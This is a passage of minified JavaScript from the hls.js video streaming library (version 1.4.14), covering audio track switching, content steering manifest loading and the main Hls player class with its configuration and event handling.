track"),a.currentTime=h+.05),this.getNextFragment(t,i)),r=!1;if(e&&this.isLoopLoading(e,t)&&(r=!!e.gap,e=this.getNextFragmentLoopLoading(e,i,s,A,c)),e){if((u=n&&e.start>n.end+i.targetduration)||(null==n||!n.len)&&s.len){if(null===(l=this.getAppendedFrag(e.start,A)))return;if(r=r||!!l.gap||!!u&&0===n.len,u&&!r||r&&s.nextStart&&s.nextStart<l.end)return}this.loadFragment(e,o,t)}else this.bufferFlushed=!0}}}}getMaxBufferLength(t){var e=super.getMaxBufferLength();return t?Math.min(Math.max(e,t),this.config.maxMaxBufferLength):e}onMediaDetaching(){this.videoBuffer=null,super.onMediaDetaching()}onAudioTracksUpdated(t,{audioTracks:e}){this.resetTransmuxer(),this.levels=e.map((t=>new Ke(t)))}onAudioTrackSwitching(t,e){var r=!!e.url,n=(this.trackId=e.id,this).fragCurrent;n&&(n.abortRequests(),this.removeUnbufferedFrags(n.start)),this.resetLoadingState(),r?this.setInterval(100):this.resetTransmuxer(),r?(this.switchingTrack=e,this.state=L_IDLE):(this.switchingTrack=null,this.bufferedTrack=e,this.state=L_STOPPED),this.tick()}onManifestLoading(){this.fragmentTracker.removeAllFragments(),this.startPosition=this.lastCurrentTime=0,this.bufferFlushed=!1,this.levels=this.mainDetails=this.waitingData=this.bufferedTrack=this.cachedTrackLoadedData=this.switchingTrack=null,this.startFragRequested=!1,this.trackId=this.videoTrackCC=this.waitingVideoCC=-1}onLevelLoaded(t,e){this.mainDetails=e.details,null!==this.cachedTrackLoadedData&&(this.hls.trigger($.AUDIO_TRACK_LOADED,this.cachedTrackLoadedData),this.cachedTrackLoadedData=null)}onAudioTrackLoaded(t,e){if(null==this.mainDetails)this.cachedTrackLoadedData=e;else{var r=this.levels,{details:e,id:n}=e;if(r){this.log(`Track ${n} loaded [${e.startSN},${e.endSN}]${e.lastPartSn?`[part-${e.lastPartSn}-${e.lastPartIndex}]`:""},duration:`+e.totalduration),r=r[n];let t=0;if(e.live||null!=(i=r.details)&&i.live){this.checkLiveUpdate(e);var i=this.mainDetails;if(e.deltaUpdateFailed||!i)return;t=!r.details&&e.hasProgramDateTime&&i.hasProgramDateTime?(Nr(e,i),e.fragments[0].start):this.alignPlaylists(e,r.details)}r.details=e,this.levelLastLoaded=n,this.startFragRequested||!this.mainDetails&&e.live||this.setStartPosition(r.details,t),this.state!==L_WAITING_TRACK||this.waitForCdnTuneIn(e)||(this.state=L_IDLE),this.tick()}else this.warn("Audio tracks were reset while loading level "+n)}}_handleFragmentLoadProgress(e){var{frag:e,part:r,payload:n}=e,{config:i,trackId:a,levels:s}=this;if(s)if(s=s[a]){var o=s.details;if(o){i=i.defaultAudioCodec||s.audioCodec||"mp4a.40.2";let t=this.transmuxer;t=t||(this.transmuxer=new Vn(this.hls,_,this._handleTransmuxComplete.bind(this),this._handleTransmuxerFlush.bind(this)));var l,u,s=this.initPTS[e.cc],h=null==(h=e.initSegment)?void 0:h.data;void 0!==s?(u=-1!==(l=r?r.index:-1),l=new Cr(e.level,e.sn,e.stats.chunkCount,n.byteLength,l,u),t.push(n,h,i,"",e,r,o.totalduration,!1,l,s)):(this.log(`Unknown video PTS for cc ${e.cc}, waiting for video PTS before demuxing audio frag ${e.sn} of [${o.startSN} ,${o.endSN}],track `+a),(u=(this.waitingData=this.waitingData||{frag:e,part:r,cache:new Qn,complete:!1}).cache).push(new Uint8Array(n)),this.waitingVideoCC=this.videoTrackCC,this.state=L_WAITING_INIT_PTS)}else this.warn("Audio track details undefined on fragment load progress"),this.removeUnbufferedFrags(e.start)}else this.warn("Audio track is undefined on fragment load progress");else this.warn(`Audio tracks were reset while fragment load was in progress. Fragment ${e.sn} of level ${e.level} will not be buffered`)}_handleFragmentLoadComplete(t){this.waitingData?this.waitingData.complete=!0:super._handleFragmentLoadComplete(t)}onBufferReset(){this.mediaBuffer=this.videoBuffer=null,this.loadedmetadata=!1}onBufferCreated(t,e){var r=e.tracks.audio;r&&(this.mediaBuffer=r.buffer||null),e.tracks.video&&(this.videoBuffer=e.tracks.video.buffer||null)}onFragBuffered(t,e){var r,{frag:e,part:n}=e;e.type!==_?this.loadedmetadata||e.type!==A||(r=this.videoBuffer||this.media)&&S.getBuffered(r).length&&(this.loadedmetadata=!0):this.fragContextChanged(e)?this.warn(`Fragment ${e.sn}${n?" p: "+n.index:""} of level ${e.level} finished buffering, but was aborted. state: ${this.state}, audioSwitch: `+(this.switchingTrack?this.switchingTrack.name:"false")):("initSegment"!==e.sn&&(this.fragPrevious=e,r=this.switchingTrack)&&(this.bufferedTrack=r,this.switchingTrack=null,this.hls.trigger($.AUDIO_TRACK_SWITCHED,f({},r))),this.fragBufferedComplete(e,n))}onError(t,e){var r;if(e.fatal)this.state=L_ERROR;else switch(e.details){case H.FRAG_GAP:case H.FRAG_PARSING_ERROR:case H.FRAG_DECRYPT_ERROR:case H.FRAG_LOAD_ERROR:case H.FRAG_LOAD_TIMEOUT:case H.KEY_LOAD_ERROR:case H.KEY_LOAD_TIMEOUT:this.onFragmentOrKeyLoadError(_,e);break;case H.AUDIO_TRACK_LOAD_ERROR:case H.AUDIO_TRACK_LOAD_TIMEOUT:case H.LEVEL_PARSING_ERROR:e.levelRetry||this.state!==L_WAITING_TRACK||(null==(r=e.context)?void 0:r.type)!==E||(this.state=L_IDLE);break;case H.BUFFER_FULL_ERROR:e.parent&&"audio"===e.parent&&this.reduceLengthAndFlushBuffer(e)&&(this.bufferedTrack=null,super.flushMainBuffer(0,Number.POSITIVE_INFINITY,"audio"));break;case H.INTERNAL_EXCEPTION:this.recoverWorkerError(e)}}onBufferFlushed(t,{type:e}){e===y&&(this.bufferFlushed=!0,this.state===L_ENDED)&&(this.state=L_IDLE)}_handleTransmuxComplete(t){var e,r,n,i,a,s,o,l,u=this.hls,{remuxResult:t,chunkMeta:h}=t,c=this.getCurrentContext(h);c?(({frag:c,part:e,level:r}=c),r=r.details,({audio:t,text:n,id3:i,initSegment:o}=t),this.fragContextChanged(c)||!r?this.fragmentTracker.removeFragment(c):(this.state=L_PARSING,this.switchingTrack&&t&&this.completeAudioSwitch(this.switchingTrack),null!=o&&o.tracks&&(a=c.initSegment||c,this._bufferInitSegment(o.tracks,a,h),u.trigger($.FRAG_PARSING_INIT_SEGMENT,{frag:a,id:"audio",tracks:o.tracks})),t&&(({startPTS:a,endPTS:o,startDTS:l,endDTS:s}=t),e&&(e.elementaryStreams[y]={startPTS:a,endPTS:o,startDTS:l,endDTS:s}),c.setElementaryStreamInfo(y,a,o,l,s),this.bufferFragmentData(t,c,e,h)),null!=i&&null!=(a=i.samples)&&a.length&&(o=G({id:"audio",frag:c,details:r},i),u.trigger($.FRAG_PARSING_METADATA,o)),n&&(l=G({id:"audio",frag:c,details:r},n),u.trigger($.FRAG_PARSING_USERDATA,l)))):this.resetWhenMissingContext(h)}_bufferInitSegment(t,e,r){var n;this.state===L_PARSING&&(t.video&&delete t.video,n=t.audio)&&(n.levelCodec=n.codec,n.id="audio",this.log(`Init audio buffer, container:${n.container}, codecs[parsed]=[${n.codec}]`),this.hls.trigger($.BUFFER_CODECS,t),null!=(t=n.initSegment)&&t.byteLength&&(n={type:"audio",frag:e,part:null,chunkMeta:r,parent:e.type,data:t},this.hls.trigger($.BUFFER_APPENDING,n)),this.tick())}loadFragment(t,e,r){var n=this.fragmentTracker.getState(t);this.fragCurrent=t,this.switchingTrack||n===mr||n===Er?"initSegment"===t.sn?this._loadInitSegment(t,e):null!=(n=e.details)&&n.live&&!this.initPTS[t.cc]?(this.log(`Waiting for video PTS in continuity counter ${t.cc} of live stream before loading audio fragment ${t.sn} of level `+this.trackId),this.state=L_WAITING_INIT_PTS):(this.startFragRequested=!0,super.loadFragment(t,e,r)):this.clearTrackerIfNeeded(t)}completeAudioSwitch(t){var{hls:e,media:r,bufferedTrack:n}=this,n=null==n?void 0:n.attrs,i=t.attrs;r&&n&&(n.CHANNELS!==i.CHANNELS||n.NAME!==i.NAME||n.LANGUAGE!==i.LANGUAGE)&&(this.log("Switching audio track : flushing all audio"),super.flushMainBuffer(0,Number.POSITIVE_INFINITY,"audio")),this.bufferedTrack=t,this.switchingTrack=null,e.trigger($.AUDIO_TRACK_SWITCHED,f({},t))}},audioTrackController:class extends dr{constructor(t){super(t,"[audio-track-controller]"),this.tracks=[],this.groupId=null,this.tracksInGroup=[],this.trackId=-1,this.currentTrack=null,this.selectDefaultTrack=!0,this.registerListeners()}registerListeners(){var t=this.hls;t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.MANIFEST_PARSED,this.onManifestParsed,this),t.on($.LEVEL_LOADING,this.onLevelLoading,this),t.on($.LEVEL_SWITCHING,this.onLevelSwitching,this),t.on($.AUDIO_TRACK_LOADED,this.onAudioTrackLoaded,this),t.on($.ERROR,this.onError,this)}unregisterListeners(){var t=this.hls;t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.MANIFEST_PARSED,this.onManifestParsed,this),t.off($.LEVEL_LOADING,this.onLevelLoading,this),t.off($.LEVEL_SWITCHING,this.onLevelSwitching,this),t.off($.AUDIO_TRACK_LOADED,this.onAudioTrackLoaded,this),t.off($.ERROR,this.onError,this)}destroy(){this.unregisterListeners(),this.tracks.length=0,this.tracksInGroup.length=0,this.currentTrack=null,super.destroy()}onManifestLoading(){this.tracks=[],this.groupId=null,this.tracksInGroup=[],this.trackId=-1,this.currentTrack=null,this.selectDefaultTrack=!0}onManifestParsed(t,e){this.tracks=e.audioTracks||[]}onAudioTrackLoaded(t,e){var r,{id:n,groupId:i,details:a}=e,s=this.tracksInGroup[n];s&&s.groupId===i?(r=s.details,s.details=e.details,this.log(`audio-track ${n} "${s.name}" lang:${s.lang} group:${i} loaded [${a.startSN}-${a.endSN}]`),n===this.trackId&&this.playlistLoaded(n,e,r)):this.warn(`Track with id:${n} and group:${i} not found in active group `+s.groupId)}onLevelLoading(t,e){this.switchLevel(e.level)}onLevelSwitching(t,e){this.switchLevel(e.level)}switchLevel(t){var e;if(null!=(t=this.hls.levels[t])&&t.audioGroupIds){const r=t.audioGroupIds[t.urlId];this.groupId!==r?(this.groupId=r||null,t=this.tracks.filter((t=>!r||t.groupId===r)),this.selectDefaultTrack&&!t.some((t=>t.default))&&(this.selectDefaultTrack=!1),e={audioTracks:this.tracksInGroup=t},this.log(`Updating audio tracks, ${t.length} track(s) found in group:`+r),this.hls.trigger($.AUDIO_TRACKS_UPDATED,e),this.selectInitialTrack()):this.shouldReloadPlaylist(this.currentTrack)&&this.setAudioTrack(this.trackId)}}onError(t,e){!e.fatal&&e.context&&e.context.type===E&&e.context.id===this.trackId&&e.context.groupId===this.groupId&&(this.requestScheduled=-1,this.checkRetry(e))}get audioTracks(){return this.tracksInGroup}get audioTrack(){return this.trackId}set audioTrack(t){this.selectDefaultTrack=!1,this.setAudioTrack(t)}setAudioTrack(t){var e,r,n,i=this.tracksInGroup;t<0||t>=i.length?this.warn("Invalid id passed to audio-track controller"):(this.clearTimer(),e=this.currentTrack,i[this.trackId],({groupId:r,name:n}=i=i[t]),this.log(`Switching to audio-track ${t} "${n}" lang:${i.lang} group:`+r),this.trackId=t,this.currentTrack=i,this.selectDefaultTrack=!1,this.hls.trigger($.AUDIO_TRACK_SWITCHING,f({},i)),i.details&&!i.details.live||(n=this.switchParams(i.url,null==e?void 0:e.details),this.loadPlaylist(n)))}selectInitialTrack(){var t=this.tracksInGroup,e=this.findTrackId(this.currentTrack)|this.findTrackId(null);-1!=e?this.setAudioTrack(e):(e=new Error(`No track found for running audio group-ID: ${this.groupId} track count: `+t.length),this.warn(e.message),this.hls.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.AUDIO_TRACK_LOAD_ERROR,fatal:!0,error:e}))}findTrackId(e){var r=this.tracksInGroup;for(let t=0;t<r.length;t++){var n=r[t];if(!this.selectDefaultTrack||n.default){if(!e||void 0!==e.attrs["STABLE-RENDITION-ID"]&&e.attrs["STABLE-RENDITION-ID"]===n.attrs["STABLE-RENDITION-ID"])return n.id;if(e.name===n.name&&e.lang===n.lang)return n.id}}return-1}loadPlaylist(e){super.loadPlaylist();var r=this.tracksInGroup[this.trackId];if(this.shouldLoadPlaylist(r)){var n=r.id,i=r.groupId;let t=r.url;if(e)try{t=e.addDirectives(t)}catch(t){this.warn("Could not construct new URL with HLS Delivery Directives: "+t)}this.log(`loading audio-track playlist ${n} "${r.name}" lang:${r.lang} group:`+i),this.clearTimer(),this.hls.trigger($.AUDIO_TRACK_LOADING,{url:t,id:n,groupId:i,deliveryDirectives:e||null})}}},emeController:Qi,cmcdController:na,contentSteeringController:class{constructor(t){this.hls=void 0,this.log=void 0,this.loader=null,this.uri=null,this.pathwayId=".",this.pathwayPriority=null,this.timeToLoad=300,this.reloadTimer=-1,this.updated=0,this.started=!1,this.enabled=!0,this.levels=null,this.audioTracks=null,this.subtitleTracks=null,this.penalizedPathways={},this.hls=t,this.log=V.log.bind(V,"[content-steering]:"),this.registerListeners()}registerListeners(){var t=this.hls;t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.MANIFEST_LOADED,this.onManifestLoaded,this),t.on($.MANIFEST_PARSED,this.onManifestParsed,this),t.on($.ERROR,this.onError,this)}unregisterListeners(){var t=this.hls;t&&(t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.MANIFEST_LOADED,this.onManifestLoaded,this),t.off($.MANIFEST_PARSED,this.onManifestParsed,this),t.off($.ERROR,this.onError,this))}startLoad(){var t;this.started=!0,self.clearTimeout(this.reloadTimer),this.enabled&&this.uri&&(this.updated?(t=Math.max(1e3*this.timeToLoad-(performance.now()-this.updated),0),this.scheduleRefresh(this.uri,t)):this.loadSteeringManifest(this.uri))}stopLoad(){this.started=!1,this.loader&&(this.loader.destroy(),this.loader=null),self.clearTimeout(this.reloadTimer)}destroy(){this.unregisterListeners(),this.stopLoad(),this.hls=null,this.levels=this.audioTracks=this.subtitleTracks=null}removeLevel(e){var t=this.levels;t&&(this.levels=t.filter((t=>t!==e)))}onManifestLoading(){this.stopLoad(),this.enabled=!0,this.timeToLoad=300,this.updated=0,this.uri=null,this.pathwayId=".",this.levels=this.audioTracks=this.subtitleTracks=null}onManifestLoaded(t,e){null!==(e=e.contentSteering)&&(this.pathwayId=e.pathwayId,this.uri=e.uri,this.started)&&this.startLoad()}onManifestParsed(t,e){this.audioTracks=e.audioTracks,this.subtitleTracks=e.subtitleTracks}onError(t,e){if(2===(null==(e=e.errorAction)?void 0:e.action)&&1===e.flags){let t=this.pathwayPriority;var r=this.pathwayId;this.penalizedPathways[r]||(this.penalizedPathways[r]=performance.now()),(t=!t&&this.levels?this.levels.reduce(((t,e)=>(-1===t.indexOf(e.pathwayId)&&t.push(e.pathwayId),t)),[]):t)&&1<t.length&&(this.updatePathwayPriority(t),e.resolved=this.pathwayId!==r)}}filterParsedLevels(t){this.levels=t;let e=this.getLevelsForPathway(this.pathwayId);var r;return 0===e.length&&(r=t[0].pathwayId,this.log(`No levels found in Pathway ${this.pathwayId}. Setting initial Pathway to "${r}"`),e=this.getLevelsForPathway(r),this.pathwayId=r),e.length!==t.length?(this.log(`Found ${e.length}/${t.length} levels in Pathway "${this.pathwayId}"`),e):t}getLevelsForPathway(e){return null===this.levels?[]:this.levels.filter((t=>e===t.pathwayId))}updatePathwayPriority(e){this.pathwayPriority=e;const r=this.penalizedPathways,n=performance.now();Object.keys(r).forEach((t=>{3e5<n-r[t]&&delete r[t]}));for(let t=0;t<e.length;t++){var i=e[t];if(!r[i]){if(i===this.pathwayId)return;var a,s=this.hls.nextLoadLevel,o=this.hls.levels[s];if(0<(a=this.getLevelsForPathway(i)).length){this.log(`Setting Pathway to "${i}"`),this.pathwayId=i,this.hls.trigger($.LEVELS_UPDATED,{levels:a}),i=this.hls.levels[s],o&&i&&this.levels&&(i.attrs["STABLE-VARIANT-ID"]!==o.attrs["STABLE-VARIANT-ID"]&&i.bitrate!==o.bitrate&&this.log(`Unstable Pathways change from bitrate ${o.bitrate} to `+i.bitrate),this.hls.nextLoadLevel=s);break}}}}clonePathways(t){const r=this.levels;if(r){const s={},o={};t.forEach((t=>{const{ID:i,"BASE-ID":e,"URI-REPLACEMENT":a}=t;r.some((t=>t.pathwayId===i))||(t=this.getLevelsForPathway(e).map((t=>{var e=G({},t),r=((t=(e.details=void 0,e.url=aa(t.uri,t.attrs["STABLE-VARIANT-ID"],"PER-VARIANT-URIS",a),new B(t.attrs)))["PATHWAY-ID"]=i,t.AUDIO&&t.AUDIO+"_clone_"+i),n=t.SUBTITLES&&t.SUBTITLES+"_clone_"+i;return gr(t=(r&&(s[t.AUDIO]=r,t.AUDIO=r),n&&(o[t.SUBTITLES]=n,t.SUBTITLES=n),e.attrs=t,new Ke(e)),"audio",r),gr(t,"text",n),t})),r.push(...t),ia(this.audioTracks,s,a,i),ia(this.subtitleTracks,o,a,i))}))}}loadSteeringManifest(e){var t=this.hls.config,r=t.loader;let s;this.loader&&this.loader.destroy(),this.loader=new r(t);try{s=new self.URL(e)}catch(t){return this.enabled=!1,void this.log("Failed to parse Steering Manifest URI: "+e)}"data:"!==s.protocol&&(r=0|(this.hls.bandwidthEstimate||t.abrEwmaDefaultEstimate),s.searchParams.set("_HLS_pathway",this.pathwayId),s.searchParams.set("_HLS_throughput",""+r)),e={responseType:"json",url:s.href},t=(r=t.steeringManifestLoadPolicy.default).errorRetry||r.timeoutRetry||{},r={loadPolicy:r,timeout:r.maxLoadTimeMs,maxRetry:t.maxNumRetry||0,retryDelay:t.retryDelayMs||0,maxRetryDelay:t.maxRetryDelayMs||0},t={onSuccess:(e,t,r,n)=>{if(this.log(`Loaded steering manifest: "${s}"`),1!==(e=e.data).VERSION)this.log(`Steering VERSION ${e.VERSION} not supported!`);else{this.updated=performance.now(),this.timeToLoad=e.TTL;var{"RELOAD-URI":e,"PATHWAY-CLONES":i,"PATHWAY-PRIORITY":a}=e;if(e)try{this.uri=new self.URL(e,s).href}catch(t){return this.enabled=!1,void this.log("Failed to parse Steering Manifest RELOAD-URI: "+e)}this.scheduleRefresh(this.uri||r.url),i&&this.clonePathways(i),a&&this.updatePathwayPriority(a)}},onError:(e,r,t,n)=>{if(this.log(`Error loading steering manifest: ${e.code} ${e.text} (${r.url})`),this.stopLoad(),410===e.code)this.enabled=!1,this.log(`Steering manifest ${r.url} no longer available`);else{let t=1e3*this.timeToLoad;429===e.code?("function"==typeof(null==(e=this.loader)?void 0:e.getResponseHeader)&&(e=e.getResponseHeader("Retry-After"))&&(t=1e3*parseFloat(e)),this.log(`Steering manifest ${r.url} rate limited`)):this.scheduleRefresh(this.uri||r.url,t)}},onTimeout:(t,e,r)=>{this.log(`Timeout loading steering manifest (${e.url})`),this.scheduleRefresh(this.uri||e.url)}},this.log("Requesting steering manifest: "+s),this.loader.load(e,r,t)}scheduleRefresh(t,e=1e3*this.timeToLoad){self.clearTimeout(this.reloadTimer),this.reloadTimer=self.setTimeout((()=>{this.loadSteeringManifest(t)}),e)}}});function ga(r){return r&&"object"==typeof r?Array.isArray(r)?r.map(ga):Object.keys(r).reduce(((t,e)=>(t[e]=ga(r[e]),t)),{}):r}class C{static get version(){return"1.4.14"}static isSupported(){return!!(e=ie())&&(t=Hr(),e=e&&"function"==typeof e.isTypeSupported&&e.isTypeSupported('video/mp4; codecs="avc1.42E01E,mp4a.40.2"'),t=!t||t.prototype&&"function"==typeof t.prototype.appendBuffer&&"function"==typeof t.prototype.remove,!!e)&&!!t;var t,e}static get Events(){return $}static get ErrorTypes(){return K}static get ErrorDetails(){return H}static get DefaultConfig(){return C.defaultConfig||pa}static set DefaultConfig(t){C.defaultConfig=t}constructor(t={}){this.config=void 0,this.userConfig=void 0,this.coreComponents=void 0,this.networkControllers=void 0,this._emitter=new Kn,this._autoLevelCapping=void 0,this._maxHdcpLevel=null,this.abrController=void 0,this.bufferController=void 0,this.capLevelController=void 0,this.latencyController=void 0,this.levelController=void 0,this.streamController=void 0,this.audioTrackController=void 0,this.subtitleTrackController=void 0,this.emeController=void 0,this.cmcdController=void 0,this._media=null,this.url=null;var e=t.debug||!1,r="Hls instance";if(self.console&&!0===e||"object"==typeof e){!function nt(r,...t){t.forEach((function(t){var e;rt[t]=r[t]?r[t].bind(r):(e=self.console[t])?e.bind(self.console,`[${t}] >`):tt}))}(e,"debug","log","info","warn","error");try{rt.log(`Debug logs enabled for "${r}" in hls.js version 1.4.14`)}catch(t){rt=et}}else rt=et;e=this.config=function(t,l){if((l.liveSyncDurationCount||l.liveMaxLatencyDurationCount)&&(l.liveSyncDuration||l.liveMaxLatencyDuration))throw new Error("Illegal hls.js config: don't mix up liveSyncDurationCount/liveMaxLatencyDurationCount and liveSyncDuration/liveMaxLatencyDuration");if(void 0!==l.liveMaxLatencyDurationCount&&(void 0===l.liveSyncDurationCount||l.liveMaxLatencyDurationCount<=l.liveSyncDurationCount))throw new Error('Illegal hls.js config: "liveMaxLatencyDurationCount" must be greater than "liveSyncDurationCount"');if(void 0!==l.liveMaxLatencyDuration&&(void 0===l.liveSyncDuration||l.liveMaxLatencyDuration<=l.liveSyncDuration))throw new Error('Illegal hls.js config: "liveMaxLatencyDuration" must be greater than "liveSyncDuration"');const u=ga(t),e=["TimeOut","MaxRetry","RetryDelay","MaxRetryTimeout"];return["manifest","level","frag"].forEach((i=>{const a=`${"level"===i?"playlist":i}LoadPolicy`,s=void 0===l[a],o=[];e.forEach((t=>{var e=i+"Loading"+t,r=l[e];if(void 0!==r&&s){o.push(e);var n=u[a].default;switch(l[a]={default:n},t){case"TimeOut":n.maxLoadTimeMs=r,n.maxTimeToFirstByteMs=r;break;case"MaxRetry":n.errorRetry.maxNumRetry=r,n.timeoutRetry.maxNumRetry=r;break;case"RetryDelay":n.errorRetry.retryDelayMs=r,n.timeoutRetry.retryDelayMs=r;break;case"MaxRetryTimeout":n.errorRetry.maxRetryDelayMs=r,n.timeoutRetry.maxRetryDelayMs=r}}})),o.length&&V.warn(`hls.js config: "${o.join('", "')}" setting(s) are deprecated, use "${a}": `+JSON.stringify(l[a]))})),f(f({},u),l)}(C.DefaultConfig,t);var{abrController:r,bufferController:t,capLevelController:n,errorController:i,fpsController:a}=(this.userConfig=t,this._autoLevelCapping=-1,e.progressive&&function va(t){var e=t.loader;e!==ua&&e!==oa?(V.log("[config]: Custom loader detected, cannot enable progressive streaming"),t.progressive=!1):function(){if(self.fetch&&self.AbortController&&self.ReadableStream&&self.Request)try{return new self.ReadableStream({}),!0}catch(t){}return!1}()&&(t.loader=ua,t.progressive=!0,t.enableSoftwareAES=!0,V.log("[config]: Progressive streaming enabled, using FetchLoader"))}(e),e),i=new i(this),n=(r=this.abrController=new r(this),t=this.bufferController=new t(this),this.capLevelController=new n(this)),a=new a(this),s=new Se(this),o=new Fe(this),l=(l=e.contentSteeringController)?new l(this):null,u=this.levelController=new pr(this,l),h=new br(this),c=new Ir(this.config),d=this.streamController=new Yn(this,h,c);n.setStreamController(d),a.setStreamController(d),s=[s,u,d],l&&s.splice(1,0,l),this.networkControllers=s,u=[r,t,n,a,o,h];"function"==typeof(r=((l=((d=(this.audioTrackController=this.createController(e.audioTrackController,s),e.audioStreamController))&&s.push(new d(this,h,c)),this.subtitleTrackController=this.createController(e.subtitleTrackController,s),e.subtitleStreamController))&&s.push(new l(this,h,c)),this.createController(e.timelineController,u),c.emeController=this.emeController=this.createController(e.emeController,u),this.cmcdController=this.createController(e.cmcdController,u),this.latencyController=this.createController(Ne,u),this.coreComponents=u,s.push(i),i.onErrorOut))&&this.on($.ERROR,r,i)}createController(t,e){return t?(t=new t(this),e&&e.push(t),t):null}on(t,e,r=this){this._emitter.on(t,e,r)}once(t,e,r=this){this._emitter.once(t,e,r)}removeAllListeners(t){this._emitter.removeAllListeners(t)}off(t,e,r=this,n){this._emitter.off(t,e,r,n)}listeners(t){return this._emitter.listeners(t)}emit(t,e,r){return this._emitter.emit(t,e,r)}trigger(e,t){if(this.config.debug)return this.emit(e,e,t);try{return this.emit(e,e,t)}catch(t){V.error("An internal error happened while handling event "+e+'. Error message: "'+t.message+'". Here is a stacktrace:',t),this.trigger($.ERROR,{type:K.OTHER_ERROR,details:H.INTERNAL_EXCEPTION,fatal:!1,event:e,error:t})}return!1}listenerCount(t){return this._emitter.listenerCount(t)}destroy(){V.log("destroy"),this.trigger($.DESTROYING,void 0),this.detachMedia(),this.removeAllListeners(),this._autoLevelCapping=-1,this.url=null,this.networkControllers.forEach((t=>t.destroy())),this.networkControllers.length=0,this.coreComponents.forEach((t=>t.destroy())),this.coreComponents.length=0;var t=this.config;t.xhrSetup=t.fetchSetup=void 0,this.userConfig=null}attachMedia(t){V.log("attachMedia"),this._media=t,this.trigger($.MEDIA_ATTACHING,{media:t})}detachMedia(){V.log("detachMedia"),this.trigger($.MEDIA_DETACHING,void 0),this._media=null}loadSource(t){this.stopLoad();var e=this.media,r=this.url,n=this.url=Q.buildAbsoluteURL(self.location.href,t,{alwaysNormalize:!0});V.log("loadSource:"+n),e&&r&&(r!==n||this.bufferController.hasSourceTypes())&&(this.detachMedia(),this.attachMedia(e)),this.trigger($.MANIFEST_LOADING,{url:t})}startLoad(e=-1){V.log(`startLoad(${e})`),this.networkControllers.forEach((t=>{t.startLoad(e)}))}stopLoad(){V.log("stopLoad"),this.networkControllers.forEach((t=>{t.stopLoad()}))}swapAudioCodec(){V.log("swapAudioCodec"),this.streamController.swapAudioCodec()}recoverMediaError(){V.log("recoverMediaError");var t=this._media;this.detachMedia(),t&&this.attachMedia(t)}removeLevel(t,e=0){this.levelController.removeLevel(t,e)}get levels(){return this.levelController.levels||[]}get currentLevel(){return this.streamController.currentLevel}set currentLevel(t){V.log("set currentLevel:"+t),this.loadLevel=t,this.abrController.clearTimer(),this.streamController.immediateLevelSwitch()}get nextLevel(){return this.streamController.nextLevel}set nextLevel(t){V.log("set nextLevel:"+t),this.levelController.manualLevel=t,this.streamController.nextLevelSwitch()}get loadLevel(){return this.levelController.level}set loadLevel(t){V.log("set loadLevel:"+t),this.levelController.manualLevel=t}get nextLoadLevel(){return this.levelController.nextLoadLevel}set nextLoadLevel(t){this.levelController.nextLoadLevel=t}get firstLevel(){return Math.max(this.levelController.firstLevel,this.minAutoLevel)}set firstLevel(t){V.log("set firstLevel:"+t),this.levelController.firstLevel=t}get startLevel(){return this.levelController.startLevel}set startLevel(t){V.log("set startLevel:"+t),-1!==t&&(t=Math.max(t,this.minAutoLevel)),this.levelController.startLevel=t}get capLevelToPlayerSize(){return this.config.capLevelToPlayerSize}set capLevelToPlayerSize(t){(t=!!t)!==this.config.capLevelToPlayerSize&&(t?this.capLevelController.startCapping():(this.capLevelController.stopCapping(),this.autoLevelCapping=-1,this.streamController.nextLevelSwitch()),this.config.capLevelToPlayerSize=t)}get autoLevelCapping(){return this._autoLevelCapping}get bandwidthEstimate(){var t=this.abrController.bwEstimator;return t?t.getEstimate():NaN}get ttfbEstimate(){var t=this.abrController.bwEstimator;return t?t.getEstimateTTFB():NaN}set autoLevelCapping(t){this._autoLevelCapping!==t&&(V.log("set autoLevelCapping:"+t),this._autoLevelCapping=t)}get maxHdcpLevel(){return this._maxHdcpLevel}set maxHdcpLevel(t){-1<Be.indexOf(t)&&(this._maxHdcpLevel=t)}get autoLevelEnabled(){return-1===this.levelController.manualLevel}get manualLevel(){return this.levelController.manualLevel}get minAutoLevel(){var{levels:e,config:{minAutoBitrate:r}}=this;if(e){var n=e.length;for(let t=0;t<n;t++)if(e[t].maxBitrate>=r)return t}return 0}get maxAutoLevel(){var{levels:e,autoLevelCapping:t,maxHdcpLevel:r}=this;let n;if(n=-1===t&&e&&e.length?e.length-1:t,r)for(let t=n;t--;){var i=e[t].attrs["HDCP-LEVEL"];if(i&&i<=r)return t}return n}get nextAutoLevel(){return Math.min(Math.max(this.abrController.nextAutoLevel,this.minAutoLevel),this.maxAutoLevel)}set nextAutoLevel(t){this.abrController.nextAutoLevel=Math.max(this.minAutoLevel,t)}get playingDate(){return this.streamController.currentProgramDateTime}get mainForwardBufferInfo(){return this.streamController.getMainFwdBufferInfo()}get audioTracks(){var t=this.audioTrackController;return t?t.audioTracks:[]}get audioTrack(){var t=this.audioTrackController;return t?t.audioTrack:-1}set audioTrack(t){var e=this.audioTrackController;e&&(e.audioTrack=t)}get subtitleTracks(){var t=this.subtitleTrackController;return t?t.subtitleTracks:[]}get subtitleTrack(){var t=this.subtitleTrackController;return t?t.subtitleTrack:-1}get media(){return this._media}set subtitleTrack(t){var e=this.subtitleTrackController;e&&(e.subtitleTrack=t)}get subtitleDisplay(){var t=this.subtitleTrackController;return!!t&&t.subtitleDisplay}set subtitleDisplay(t){var e=this.subtitleTrackController;e&&(e.subtitleDisplay=t)}get lowLatencyMode(){return this.config.lowLatencyMode}set lowLatencyMode(t){this.config.lowLatencyMode=t}get liveSyncPosition(){return this.latencyController.liveSyncPosition}get latency(){return this.latencyController.latency}get maxLatency(){return this.latencyController.maxLatency}get targetLatency(){return this.latencyController.targetLatency}get drift(){return this.latencyController.drift}get forceStartLoad(){return this.streamController.forceStartLoad}}function ma(e,t){var r,n=Object.keys(e);return Object.getOwnPropertySymbols&&(r=Object.getOwnPropertySymbols(e),t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)),n}function ya(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?ma(Object(r),!0).forEach((function(t){i()(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):ma(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}C.defaultConfig=void 0;var 